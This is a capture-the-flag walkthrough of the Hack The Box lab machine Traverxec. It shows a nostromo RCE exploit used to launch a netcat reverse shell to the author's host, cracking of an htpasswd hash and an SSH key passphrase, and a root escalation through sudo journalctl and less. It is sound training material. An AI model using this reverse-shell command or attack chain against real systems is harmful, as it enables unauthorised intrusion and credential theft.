# Scan

```bash
ghost@localhost [11:03:29] [~/Documents/hacking/tj-null-boxes/traverxec] [master *]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.165:22
Open 10.10.10.165:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
| http-methods:
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# 80

Looks like generic Bootstrap website. When I look at the web server (at HTTP header), it is using a unique one called `nostromo 1.9.6`.

With simple googling I found out it is vulnerable to RCE (https://www.exploit-db.com/exploits/47837).

```bash
ghost@localhost [11:19:15] [~/Documents/hacking/tj-null-boxes/traverxec] [master *]
-> % python2 47837.py $IP 80 id
HTTP/1.1 200 OK
Date: Sun, 13 Nov 2022 03:19:20 GMT
Server: nostromo 1.9.6
Connection: close

uid=33(www-data) gid=33(www-data) groups=33(www-data)


ghost@localhost [11:19:49] [~/Documents/hacking/tj-null-boxes/traverxec] [master *]
-> % python2 47837.py $IP 80 "nc -nv 10.10.14.8 4444 -e /bin/bash"
```

So I can easily get a reverse shell with same exploit.

```bash
ghost@localhost [11:19:53] [~/Documents/hacking/tj-null-boxes/traverxec] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.165] 45822
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


# User

Found one user under home, and root. (ignore `sync`).

```bash
www-data@traverxec:/usr/bin$ ls /home
david

www-data@traverxec:/usr/bin$ cat /etc/passwd | grep -v 'nologin\|false'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
david:x:1000:1000:david,,,:/home/david:/bin/bash
```

Running linpeas gives some interesting outputs

```bash
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Sep 16 10:47 /etc/ldap

════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 427K Oct  6  2019 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 154K Oct 12  2019 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
```

I cracked the `.htpasswd` of user `david`. The password is `Nowonly4me`. I attempted to try SSH to see if there's password reuse and it failed.

```bash
ghost@localhost [14:55:01] [~/Documents/hacking/tj-null-boxes/traverxec] [master *]
-> % john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status

Nowonly4me       (?)

1 1g 0:00:00:23 DONE (2022-11-13 14:55) 0.04344g/s 114882p/s 114882c/s 114882C/s Np_07_07..Noviembre8
Waiting for 3 children to terminate
3 0g 0:00:00:23 DONE (2022-11-13 14:55) 0g/s 114720p/s 114720c/s 114720C/s NataLiE15..Nat112
4 0g 0:00:00:23 DONE (2022-11-13 14:55) 0g/s 114723p/s 114723c/s 114723C/s NatGav..Nasty9
2 0g 0:00:00:23 DONE (2022-11-13 14:55) 0g/s 114748p/s 114748c/s 114748C/s Nat8503c..Nastieboy6
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Looking through `/var/nostromo/conf`.

```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

From the config, I found `/home` set has `homedirs` set to `/home` path.

The documentation is here (https://www.nazgul.ch/dev/nostromo_man.html).

Basically `HOMEDIRS` is to serve the home directories of the user via HTTP. Based on the documentation, to access the user home directory, enter a `~` in the URL followed by the home directory name.

So I check http://10.10.10.165/~david/ and it shows a new URL.

`index.php` gives 404, but i tried `index.html` and works. So it is just hosting html file (http://10.10.10.165/~david/index.html).

Since `homedirs_public` is `public_www` I went to `/home/david/public_www` to see what files are hosted.

Found `backup-ssh-dentity-files.tgz` under `protected-file-area`, so I downloaded it to local using `david:Nowonly4me` credential via HTTP.

Inside found a `ssh` key for the user david. It is password protected, so I use `john the ripper` to crack the password.

```bash
ghost@localhost [15:14:45] [~/Documents/hacking/tj-null-boxes/traverxec] [master *]
-> % ssh2john david_rsa > rsa_hash

ghost@localhost [15:15:02] [~/Documents/hacking/tj-null-boxes/traverxec] [master *]
-> % john rsa_hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status

hunter           (david_rsa)

1 1g 0:00:00:00 DONE (2022-11-13 15:15) 11.11g/s 400.0p/s 400.0c/s 400.0C/s 11111..hunter
Waiting for 3 children to terminate
2 0g 0:00:00:02 DONE (2022-11-13 15:15) 0g/s 1792Kp/s 1792Kc/s 1792KC/s             .abygurl69
3 0g 0:00:00:02 DONE (2022-11-13 15:15) 0g/s 1792Kp/s 1792Kc/s 1792KC/sa6_123
4 0g 0:00:00:02 DONE (2022-11-13 15:15) 0g/s 1792Kp/s 1792Kc/s 1792KC/s xCvBnM,..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Then I manage to login as the user `david`.

```bash
ghost@localhost [15:15:50] [~/Documents/hacking/tj-null-boxes/traverxec] [master *]
-> % ssh david@10.10.10.165 -i david_rsa
Enter passphrase for key 'david_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64

david@traverxec:~$ cat user.txt
4fc7ea3fd798eec95886b5757b02c3f4
```


# Privilege escalation

I checked SUIDs.

```bash
david@traverxec:~$ find / -perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/umount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
```

Running linpeas give me writable path abuse for Privilege escalation.

```bash
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
New path exported: /home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
```

So I look what files are in `/home/david/bin`. Found `server-stats.sh`. Looking the content, it shows that the user `david` can run `journalctl` as sudo.

```bash
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh

david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Journalctl actually uses `less`. So according to the GTFO bin, if the log is long, it will concat and shows in line by line.

During that, `!/bin/sh` can be entered to receives interactive shell.

> But there's a very weird thing with less. The command prompt has to be smal lenough so that the entire script cannot be display on the screen and force the journalctl to use `less`.
> So I resized the terminal to super small and run the command.

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sun 2022-11-13 03:05:09 EST, end at Sun 2022-11-13 03:31:20 EST
Nov 13 03:05:11 traverxec systemd[1]: Starting nostromo nhttpd server...
Nov 13 03:05:11 traverxec systemd[1]: nostromo.service: Can't open PID file /var
Nov 13 03:05:11 traverxec nhttpd[499]: started
Nov 13 03:05:11 traverxec nhttpd[499]: max. file descriptors = 1040 (cur) / 1040
Nov 13 03:05:11 traverxec systemd[1]: Started nostromo nhttpd server.
!/bin/bash
root@traverxec:/home/david/bin# cd ~

root@traverxec:~# cat root.txt
eb46ffeb77a22922501134f5ecf660cd
```
